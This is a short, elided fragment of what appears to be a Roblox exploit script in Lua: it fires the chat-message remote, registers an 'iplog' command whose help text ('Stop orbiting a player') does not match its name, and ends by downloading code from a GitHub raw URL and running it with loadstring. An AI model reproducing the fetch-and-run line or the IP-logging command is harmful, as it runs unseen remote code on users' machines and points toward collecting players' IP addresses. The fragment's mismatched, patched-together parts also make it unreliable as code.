...
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(A_1,A_2)
 ...
 cmd.add({"iplog", "infolog"}, {"iplog <player>", "Stop orbiting a player"}, function(...)
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/funnianklebreaking/RandomLuaCode/main/yes"))()
 --[[
